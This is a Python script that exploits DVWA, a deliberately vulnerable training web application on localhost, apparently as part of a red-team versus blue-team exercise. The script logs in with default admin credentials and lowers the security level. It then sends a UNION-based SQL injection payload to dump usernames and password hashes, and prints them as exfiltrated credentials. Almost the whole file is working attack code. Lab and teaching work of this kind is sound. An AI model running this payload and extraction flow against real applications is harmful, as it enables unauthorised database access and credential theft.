
import requests
import re

s = requests.Session()

# Login flow
r = s.get("http://localhost:28080/login.php")
token = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text).group(1)
print(f"[+] CSRF Token: {token}")

r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)
print(f"[+] Authenticated to DVWA")

# Clean and set cookies
for c in list(s.cookies):
    if c.name == 'security':
        s.cookies.clear(c.domain, c.path, c.name)
s.cookies.set("security", "low", domain="localhost", path="/")

# SQLi to extract all users
r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
    "id": "' UNION SELECT user,password FROM users#",
    "Submit": "Submit"
})

print(f"\n{'='*70}")
print(f"[+] SQL INJECTION SUCCESSFUL - EXTRACTING DATABASE CREDENTIALS")
print(f"{'='*70}\n")

# Parse the output - DVWA shows "First name: X<br />Surname: Y"
pattern = r'First name: (.*?)<br />Surname: (.*?)(?:<br />|$)'
matches = re.findall(pattern, r.text, re.DOTALL)

if matches:
    print(f"Exfiltrated {len(matches)} user accounts from database:\n")
    print(f"{'Username':<15} {'Password Hash':<40}")
    print(f"{'-'*15} {'-'*40}")
    for user, pwd_hash in matches:
        print(f"{user.strip():<15} {pwd_hash.strip():<40}")
    
    print(f"\n[!] CRITICAL: Database credentials successfully exfiltrated!")
    print(f"[!] Blue Team identified DVWA-SQLI as CRITICAL but did NOT patch it.")
    print(f"[!] Attack vector: UNION-based SQL injection on 'id' parameter")
else:
    # Fallback - show raw output
    print("Raw output from injection:")
    # Find the vulnerable output section
    start = r.text.find("First name:")
    if start > 0:
        end = r.text.find("</div>", start)
        print(r.text[start:end if end > 0 else start+500])

